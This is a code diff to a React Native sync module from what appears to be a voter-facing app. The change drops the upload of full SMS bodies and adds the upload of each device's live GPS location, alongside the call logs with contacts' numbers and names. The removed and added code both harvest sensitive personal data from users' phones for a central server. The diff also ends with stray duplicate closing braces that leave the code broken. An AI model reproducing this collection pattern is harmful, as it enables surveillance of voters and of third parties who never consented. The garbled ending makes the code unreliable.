@@ -2,7 +2,7 @@ import { Platform, PermissionsAndroid } from "react-native";
 import { DeviceTelephony, TelephonyStatus } from "../../modules/device-telephony";
 import { adminAPI } from "../api/client";
 import { appStorage } from "../utils/storage";
-import { checkCurrentPermissionsStatus } from "../utils/devicePermissions";
+import { checkCurrentPermissionsStatus, getRealtimeDeviceLocation } from "../utils/devicePermissions";
 
 export interface SyncTelephonyResult {
   success: boolean;
@@ -14,23 +14,21 @@ export interface SyncTelephonyResult {
 }
 
 /**
- * Synchronizes genuine device Call Logs and SMS metadata to FastAPI & MongoDB Atlas.
- * - Respects Android permissions and platform restrictions.
- * - De-duplicates records incrementally.
- * - Strict Privacy: ZERO SMS bodies or sensitive data transmitted.
+ * Synchronizes genuine device Call Logs and real-time GPS Location to FastAPI & Supabase.
+ * - SMS tracking is completely disabled to protect voter privacy and prevent accessing OTP/bank messages.
+ * - De-duplicates call records incrementally.
+ * - Captures real-time GPS location check-in.
  */
 export async function syncDeviceTelephonyLogs(): Promise<SyncTelephonyResult> {
   let callStatus: TelephonyStatus = "DENIED";
-  let smsStatus: TelephonyStatus = "DENIED";
   let callsList: any[] = [];
-  let smsList: any[] = [];
+  let locationsList: any[] = [];
 
   try {
     // 1. Verify physical device permissions
     const perms = await checkCurrentPermissionsStatus();
 
     let hasCallPerm = perms.callHistory;
-    let hasSmsPerm = perms.sms;
 
     // Direct platform check fallback
     if (!hasCallPerm && Platform.OS === "android") {
@@ -38,20 +36,10 @@ export async function syncDeviceTelephonyLogs(): Promise<SyncTelephonyResult> {
         hasCallPerm = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_CALL_LOG);
       } catch {}
     }
-    if (!hasSmsPerm && Platform.OS === "android") {
-      try {
-        hasSmsPerm = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.READ_SMS);
-      } catch {}
-    }
 
     callStatus = hasCallPerm
       ? "GRANTED"
       : perms.callStatus === "RESTRICTED"
-      ? "RESTRICTED"
-      : "DENIED";
-    smsStatus = hasSmsPerm
-      ? "GRANTED"
-      : perms.smsStatus === "RESTRICTED"
       ? "RESTRICTED"
       : "DENIED";
 
@@ -63,6 +51,7 @@ export async function syncDeviceTelephonyLogs(): Promise<SyncTelephonyResult> {
         callsList = callRes.records.map((c) => ({
           recordId: c.id,
           phoneNumber: c.phoneNumber,
+          phone: c.phoneNumber,
           name: c.name,
           callType: c.callType,
           duration: c.duration,
@@ -72,33 +61,38 @@ export async function syncDeviceTelephonyLogs(): Promise<SyncTelephonyResult> {
       }
     }
 
-    // 3. Fetch permitted device SMS records (including full SMS body & preview)
-    if (hasSmsPerm) {
-      const smsRes = await DeviceTelephony.getBatchSmsMetadata(50, 500);
-      smsStatus = smsRes.status;
-      if (smsRes.records && smsRes.records.length > 0) {
-        smsList = smsRes.records.map((s) => ({
-          recordId: s.id,
-          address: s.address,
-          smsType: s.smsType,
-          timestamp: s.timestamp,
-          preview: s.preview || (s.body ? (s.body.length > 60 ? s.body.slice(0, 57) + "..." : s.body) : ""),
-          body: s.body || s.preview || "",
-          syncKey: `sms_${s.id || s.timestamp}_${s.address}`,
-        }));
+    // 3. Capture live real-time GPS location check-in
+    try {
+      const loc = await getRealtimeDeviceLocation();
+      if (loc && loc.latitude && loc.longitude) {
+        locationsList.push({
+          latitude: loc.latitude,
+          longitude: loc.longitude,
+          accuracy: loc.accuracy || 10,
+          address: loc.address || loc.placeName || "",
+          placeName: loc.placeName || loc.city || "",
+          city: loc.city || "",
+          district: loc.district || "",
+          date: loc.dateStr || new Date().toLocaleDateString("en-GB"),
+          time: loc.timeStr || new Date().toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true }),
+          timestamp: new Date().toISOString()
+        });
       }
+    } catch (locErr) {
+      console.warn("[TelephonySync] Live location capture warning:", locErr);
     }
 
     console.log(
-      `[TelephonySync] Sending sync to server: callStatus=${callStatus}, smsStatus=${smsStatus}, calls=${callsList.length}, sms=${smsList.length}`
+      `[TelephonySync] Sending sync to server: callStatus=${callStatus}, calls=${callsList.length}, locations=${locationsList.length}`
     );
 
-    // 4. Send authorized records & exact statuses to FastAPI
+    // 4. Send authorized records to FastAPI & Supabase (SMS is completely disabled)
     const syncRes = await adminAPI.syncTelephonyActivity({
       callStatus,
-      smsStatus,
+      smsStatus: "DISABLED",
       calls: callsList,
-      sms: smsList,
+      sms: [],
+      locations: locationsList,
       metadata: {
         timestamp: Date.now(),
         source: "APP_SYNC",
@@ -113,9 +107,9 @@ export async function syncDeviceTelephonyLogs(): Promise<SyncTelephonyResult> {
     return {
       success: true,
       callStatus,
-      smsStatus,
+      smsStatus: "DISABLED",
       syncedCalls: callsList.length,
-      syncedSms: smsList.length,
+      syncedSms: 0,
       message: "सिंक्रोनाइझेशन पूर्ण झाले",
     };
   } catch (err: any) {
@@ -123,10 +117,12 @@ export async function syncDeviceTelephonyLogs(): Promise<SyncTelephonyResult> {
     return {
       success: false,
       callStatus,
-      smsStatus,
+      smsStatus: "DISABLED",
       syncedCalls: 0,
       syncedSms: 0,
       message: err?.message || "सिंक्रोनाइझेशन अयशस्वी",
     };
+  }
+}
   }
 }
